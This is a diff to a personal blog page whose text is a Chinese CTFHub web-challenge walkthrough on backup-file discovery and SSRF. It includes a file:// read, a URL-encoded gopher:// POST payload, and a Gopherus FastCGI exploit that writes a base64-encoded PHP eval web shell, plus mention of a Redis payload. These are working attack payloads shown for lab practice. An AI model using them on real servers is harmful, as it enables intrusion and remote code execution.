@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -172,7 +165,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/0087.jpg') no-repeat center center;
+         style="background: url('https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152231002.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      40
+      20
        分钟
     </span>
   
@@ -245,6 +238,12 @@
             <!-- SEO header -->
             <h1 style="display: none">Ctfhub</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>打开靶场是这样<br><img src="https://s1.imagehub.cc/images/2021/02/05/01.png" srcset="/img/loading.gif" alt="01.png"><br>试出了<code>www.zip</code><img src="https://ftp.bmp.ovh/imgs/2021/02/e4a53dc8cc6e31e3.png" srcset="/img/loading.gif"><br>差点让我以为是misc。。。。。。。。<br>看wp说是访问该文件名才能得到    <img src="https://s1.imagehub.cc/images/2021/02/05/03.png" srcset="/img/loading.gif" alt="03.png">      </p>
 <h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><ul>
@@ -278,7 +277,7 @@
 <h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>尝试去读取一下Web目录下的flag.php吧        </p>
 <p>题目说是web目录，用file伪协议即可<br>payload：<code>url=file:///var/www/html/flag.php</code><br>web目录要记住          </p>
 <h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>看wp说能扫出<code>index.php</code>和<code>flag.php</code>的，但我没扫出来<br>直接访问吧<br><code>/flag.php</code>——-&gt;Just View From 127.0.0.1<br>那么<code>?url=127.0.0.1/flag.php</code><img src="https://sc03.alicdn.com/kf/U16e6dcbec9894950bdd8eadca49482ecL.jpg" srcset="/img/loading.gif" alt="505.png"><br>可以用file协议读取<code>flag.php</code>        </p>
-<pre><code>&lt;?php
+<div class="hljs"><pre><code>&lt;?php
 
 error_reporting(0);
 
@@ -294,21 +293,21 @@ if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &
     echo $flag;
     exit;
 &#125;
-?&gt;</code></pre>
+?&gt;</code></pre></div>
 <p>没有提交按钮，可以用gopher协议构造post请求       </p>
-<pre><code>POST /flag.php HTTP/1.1
+<div class="hljs"><pre><code>POST /flag.php HTTP/1.1
 Host: 127.0.0.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 36
 
-key=308353d55f15e345a78047c613994fcb         </code></pre>
+key=308353d55f15e345a78047c613994fcb         </code></pre></div>
 <p>将其进行url编码，<br>然后加上<code>gopher://127.0.0.1:80/_</code><br>再次url编码<br>提交得到flag<br>payload：<code>?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D308353d55f15e345a78047c613994fcb</code></p>
 <h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>这个和上面那个差不多，也要用gopher协议<br>访问flag.php后有上传文件，但没提交按钮<br>可以自己构造一个<code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</code><br>提交抓包<br>Host改为<code>127.0.0.1</code><br>过一下上面的编码流程<br>提交       </p>
 <h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><p>这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助   </p>
 <p>这次可以使用<code>Gopherus</code>工具生成攻击fastcgi的payload     </p>
-<pre><code>python gopherus.py --exploit fastcgi
+<div class="hljs"><pre><code>python gopherus.py --exploit fastcgi
 /var/www/html/index.php                 # 这里输入的是一个已知存在的php文件
-echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php   #写入一句话&lt;?php eval($_POST[whoami]);?&gt;</code></pre>
+echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php   #写入一句话&lt;?php eval($_POST[whoami]);?&gt;</code></pre></div>
 <p><a target="_blank" rel="noopener" href="https://github.com/tarunkant/gopherus">gopher</a><br><img src="https://sc04.alicdn.com/kf/Ub52af498907e44fcb82b438d02f79f38P.jpg" srcset="/img/loading.gif" alt="507.png"><br>因为要以GET传入，所以要再进行一次url编码<br>提交后蚁剑连接即可<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">P神的fsatcgi分析</a>        </p>
 <h3 id="Redia协议"><a href="#Redia协议" class="headerlink" title="Redia协议"></a>Redia协议</h3><p>这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!     </p>
 <p>Redia也可以用gopherus直接生成payload<br><img src="https://sc01.alicdn.com/kf/U59fa33c2723c4f3899da3f7205a6a573R.jpg" srcset="/img/loading.gif" alt="508.png"><br>但这次需要将得到的payload进行两次url编码，不知道为什么，不该是一次么？？        </p>
@@ -451,7 +450,7 @@ echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shel
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -477,8 +476,6 @@ echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shel
 
 
 
-  
-    
   
 
 
